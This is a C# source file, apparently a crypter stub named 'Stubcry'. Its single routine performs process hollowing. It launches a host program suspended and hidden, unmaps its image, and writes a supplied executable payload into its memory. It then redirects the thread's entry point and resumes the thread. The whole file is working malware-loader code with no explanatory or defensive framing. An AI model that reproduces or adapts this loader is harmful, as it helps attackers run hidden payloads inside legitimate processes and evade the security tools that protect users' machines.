using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Stubcry
{
    public static class nIK64
    {
        [DllImport("kernel32.dll")]
        private static extern unsafe bool CreateProcess(
          string lpApplicationName,
          string lpCommandLine,
          IntPtr lpProcessAttributes,
          IntPtr lpThreadAttributes,
          bool bInheritHandles,
          uint dwCreationFlags,
          IntPtr lpEnvironment,
          string lpCurrentDirectory,
          nIK64.StartupInfo* lpStartupInfo,
          byte[] lpProcessInfo);

        [DllImport("kernel32.dll")]
        private static extern long VirtualAllocEx(
          long hProcess,
          long lpAddress,
          long dwSize,
          uint flAllocationType,
          uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern long WriteProcessMemory(
          long hProcess,
          long lpBaseAddress,
          byte[] lpBuffer,
          int nSize,
          long written);

        [DllImport("ntdll.dll")]
        private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(long hThread);


        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(long handle);

        public static unsafe void openfile(byte[] payloadBuffer, string host, string args)
        {
            int num1 = Marshal.ReadInt32((object)payloadBuffer, 60);
            int num2 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 56);
            int nSize = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 60);
            int num3 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 16);
            short num4 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 2);
            short num5 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 16);
            long num6 = Marshal.ReadInt64((object)payloadBuffer, num1 + 24 + 24);
            nIK64.StartupInfo startupInfo = new nIK64.StartupInfo();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(nIK64.StartupInfo));
            startupInfo.wShowWindow = (ushort)0;
            startupInfo.dwFlags = 1U;
            byte[] lpProcessInfo = new byte[24];
            IntPtr num7 = Marshal.AllocHGlobal(1232 / 16);
            string lpCommandLine = host;
            if (!string.IsNullOrEmpty(args))
                lpCommandLine = lpCommandLine + " " + args;
            string currentDirectory = Directory.GetCurrentDirectory();
            Marshal.WriteInt32(num7, 48, 1048603);
            nIK64.CreateProcess((string)null, lpCommandLine, IntPtr.Zero, IntPtr.Zero, true, 4U, IntPtr.Zero, currentDirectory, &startupInfo, lpProcessInfo);
            long num8 = Marshal.ReadInt64((object)lpProcessInfo, 0);
            long num9 = Marshal.ReadInt64((object)lpProcessInfo, 8);
            int num10 = (int)nIK64.ZwUnmapViewOfSection(num8, num6);
            nIK64.VirtualAllocEx(num8, num6, (long)num2, 12288U, 64U);
            nIK64.WriteProcessMemory(num8, num6, payloadBuffer, nSize, 0L);
            for (short index = 0; (int)index < (int)num4; ++index)
            {
                byte[] numArray = new byte[40];
                Buffer.BlockCopy((Array)payloadBuffer, num1 + (24 + (int)num5) + 40 * (int)index, (Array)numArray, 0, 40);
                int num11 = Marshal.ReadInt32((object)numArray, 12);
                int length = Marshal.ReadInt32((object)numArray, 16);
                int srcOffset = Marshal.ReadInt32((object)numArray, 20);
                byte[] lpBuffer = new byte[length];
                Buffer.BlockCopy((Array)payloadBuffer, srcOffset, (Array)lpBuffer, 0, lpBuffer.Length);
                nIK64.WriteProcessMemory(num8, num6 + (long)num11, lpBuffer, lpBuffer.Length, 0L);
            }
            nIK64.GetThreadContext(num9, num7);
            byte[] bytes = BitConverter.GetBytes(num6);
            long num12 = Marshal.ReadInt64(num7, 136);
            nIK64.WriteProcessMemory(num8, num12 + 16L, bytes, 8, 0L);
            Marshal.WriteInt64(num7, 128, num6 + (long)num3);
            nIK64.SetThreadContext(num9, num7);
            int num13 = (int)nIK64.ResumeThread(num9);
            Marshal.FreeHGlobal(num7);
            nIK64.CloseHandle(num8);
            nIK64.CloseHandle(num9);
        }

        private static IntPtr Bito(IntPtr source, int alignment)
        {
            long num = source.ToInt64() + (long)(alignment - 1);
            return new IntPtr((long)alignment * (num / (long)alignment));
        }






        [StructLayout(LayoutKind.Explicit, Size = 104)]
        public struct StartupInfo
        {
            [FieldOffset(0)]
            public uint cb;
            [FieldOffset(60)]
            public uint dwFlags;
            [FieldOffset(64)]
            public ushort wShowWindow;
        }
    }
}
